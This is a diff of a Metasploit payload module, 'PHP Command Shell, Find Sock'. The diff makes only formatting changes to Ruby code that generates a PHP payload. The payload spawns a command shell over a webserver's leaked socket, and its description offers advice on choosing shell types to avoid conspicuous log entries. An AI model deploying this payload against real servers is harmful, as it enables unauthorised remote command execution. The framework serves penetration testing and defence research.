@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -11,7 +12,6 @@ require 'msf/base/sessions/command_shell_options'
 require 'msf/core/handler/find_shell'
 
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -20,32 +20,30 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'PHP Command Shell, Find Sock',
-      'Description'   => %Q{
-        Spawn a shell on the established connection to
-        the webserver.  Unfortunately, this payload
-        can leave conspicuous evil-looking entries in the
-        apache error logs, so it is probably a good idea
-        to use a bind or reverse shell unless firewalls
-        prevent them from working.  The issue this
-        payload takes advantage of (CLOEXEC flag not set
-        on sockets) appears to have been patched on the
-        Ubuntu version of Apache and may not work on
-        other Debian-based distributions.  Only tested on
-        Apache but it might work on other web servers
-        that leak file descriptors to child processes.
-        },
-      'Author'        => [ 'egypt' ],
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'php',
-      'Handler'       => Msf::Handler::FindShell,
-      'Session'       => Msf::Sessions::CommandShell,
-      'Arch'          => ARCH_PHP
-      ))
+                     'Name'          => 'PHP Command Shell, Find Sock',
+                     'Description'   => %{
+                       Spawn a shell on the established connection to
+                       the webserver.  Unfortunately, this payload
+                       can leave conspicuous evil-looking entries in the
+                       apache error logs, so it is probably a good idea
+                       to use a bind or reverse shell unless firewalls
+                       prevent them from working.  The issue this
+                       payload takes advantage of (CLOEXEC flag not set
+                       on sockets) appears to have been patched on the
+                       Ubuntu version of Apache and may not work on
+                       other Debian-based distributions.  Only tested on
+                       Apache but it might work on other web servers
+                       that leak file descriptors to child processes.
+                       },
+                     'Author'        => [ 'egypt' ],
+                     'License'       => BSD_LICENSE,
+                     'Platform'      => 'php',
+                     'Handler'       => Msf::Handler::FindShell,
+                     'Session'       => Msf::Sessions::CommandShell,
+                     'Arch'          => ARCH_PHP))
   end
 
   def php_findsock
-
     var_cmd = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
     var_fd  = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
     var_out = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
@@ -55,8 +53,8 @@ print("<html><body>");
 flush();
 
 function mysystem(#{var_cmd}){
-  #{php_preamble()}
-  #{php_system_block({:cmd_varname=>var_cmd, :output_varname => var_out})}
+  #{php_preamble}
+  #{php_system_block(cmd_varname: var_cmd, output_varname: var_out)}
   return #{var_out};
 }
 
@@ -76,15 +74,13 @@ mysystem(#{var_cmd});
 
 END_OF_PHP_CODE
 
-
-    return shell
+    shell
   end
 
   #
   # Constructs the payload
   #
   def generate
-    return php_findsock
+    php_findsock
   end
-
 end
